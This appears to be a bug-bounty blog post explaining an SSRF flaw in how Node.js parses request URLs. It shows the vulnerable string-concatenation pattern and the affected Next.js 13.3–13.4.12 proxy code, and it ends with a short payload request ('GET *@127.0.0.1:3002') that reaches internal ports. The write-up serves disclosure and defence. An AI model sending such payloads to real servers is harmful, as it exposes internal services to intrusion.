<!doctype html><html><head></head><body><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">SSRF Pathname Confusion</h1><div class=post-meta><span title='2026-02-21 12:04:29 +0700 +0700'>February 21, 2026</span>&nbsp;·&nbsp;<span>2 min</span></div></header><div class=post-content><h1 id=ssrf-via-pathname-confusion>SSRF via pathname confusion<a hidden class=anchor aria-hidden=true href=#ssrf-via-pathname-confusion>#</a></h1><h2 id=affected-pattern>Affected pattern<a hidden class=anchor aria-hidden=true href=#affected-pattern>#</a></h2><p>Any Node.js application that constructs internal request URLs using naive string concatenation of the form:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>targetUrl</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`http://</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>host</span><span style=color:#e6db74>}</span><span style=color:#e6db74>:</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>port</span><span style=color:#e6db74>}${</span><span style=color:#a6e22e>userControlledPathname</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
</span></span></code></pre></div><p>and then passes this URL to <code>http.request</code>, <code>http.get</code>, <code>axios</code>, <code>fetch</code>, <code>http-proxy</code>, or similar libraries without strict normalization and validation.</p><p>This PoC demonstrates a Server-Side Request Forgery (SSRF) vulnerability caused by differences in how Node.js parses URLs when the path contains special characters like <code>*@</code>.</p><h2 id=root-cause>Root cause<a hidden class=anchor aria-hidden=true href=#root-cause>#</a></h2><p>HTTP/2.0 connection preface starts with a special pseudo-request to check if HTTP/2 is available to use:</p><pre tabindex=0><code>PRI * HTTP/1.0
</code></pre><p>This <code>*</code> in the request line is treated specially by some parsers. When combined with the authority form <code>user@host:port</code>, Node.js http-parser can interpret malformed request lines in unexpected ways (and considers that request line <strong>valid</strong>).</p><p>So when pathname is attacker-controlled (via query parameter, route parameter, header, etc), specially crafted values like: <code>http://localhost:3000*@localhost:8000/admin</code> can trick parsers into interpreting the string as:</p><pre tabindex=0><code>URL {
  href: &#39;http://localhost:3000*@localhost:8000/admin&#39;,
  origin: &#39;http://localhost:8000&#39;,
  protocol: &#39;http:&#39;,
  username: &#39;localhost&#39;,
  password: &#39;3000*&#39;,
  host: &#39;localhost:8000&#39;,
  hostname: &#39;localhost&#39;,
  port: &#39;8000&#39;,
  pathname: &#39;/admin&#39;,
  search: &#39;&#39;,
  searchParams: URLSearchParams {},
  hash: &#39;&#39;
}
</code></pre><p>This allows the application to send requests to arbitrary internal ports.</p><h2 id=nextjs-ssrf>Next.js SSRF<a hidden class=anchor aria-hidden=true href=#nextjs-ssrf>#</a></h2><p>In Next.js versions <code>>= 13.3.0 | &lt;= 13.4.12</code>, internal proxying used exactly this vulnerable construction</p><p>Source location <code>packages/next/src/server/lib/start-server.ts</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>getProxyServer</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>pathname</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>string</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>targetUrl</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`http://</span><span style=color:#e6db74>${</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>targetHost</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;localhost&#39;</span> <span style=color:#f92672>?</span> <span style=color:#e6db74>&#39;127.0.0.1&#39;</span> <span style=color:#f92672>:</span> <span style=color:#a6e22e>targetHost</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>}</span><span style=color:#e6db74>:</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>routerPort</span><span style=color:#e6db74>}${</span><span style=color:#a6e22e>pathname</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>proxyServer</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>httpProxy</span>.<span style=color:#a6e22e>createProxy</span>({
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>target</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>targetUrl</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>changeOrigin</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>false</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>ignorePath</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>xfwd</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>ws</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>followRedirects</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>false</span>,
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>proxyServer</span>.<span style=color:#a6e22e>on</span>(<span style=color:#e6db74>&#39;error&#39;</span>, (<span style=color:#a6e22e>_err</span>) =&gt; {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// TODO?: enable verbose error logs with --debug flag?
</span></span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>proxyServer</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Since <code>pathname</code> is fully user-controlled, the <code>*@localhost:8000</code> payloads allowed full SSRF — including reading responses from internal services.</p><p>From 13.4.13 onward, internal requests switched to <code>fetch()</code> with proper URL normalization. <code>fetch</code> rejects malformed parts, blocking the attack.</p><p>This internal proxying feature can be enabled by default (in App Router apps) or by using this config:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75715e>// next.config.js
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>experimental</span><span style=color:#f92672>:</span> {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>appDir</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h3><p>Request with payload:</p><pre tabindex=0><code>GET *@127.0.0.1:3002 HTTP/1.1
Host: vulnerable.app
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://evtdanya.github.io/tags/ssrf/>Ssrf</a></li><li><a href=https://evtdanya.github.io/tags/bug-bounty/>Bug Bounty</a></li><li><a href=https://evtdanya.github.io/tags/nodejs/>Nodejs</a></li><li><a href=https://evtdanya.github.io/tags/nextjs/>Nextjs</a></li></ul></footer></article><script data-goatcounter=https://evtdanya.goatcounter.com/count async src=//gc.zgo.at/count.js></script></body></html>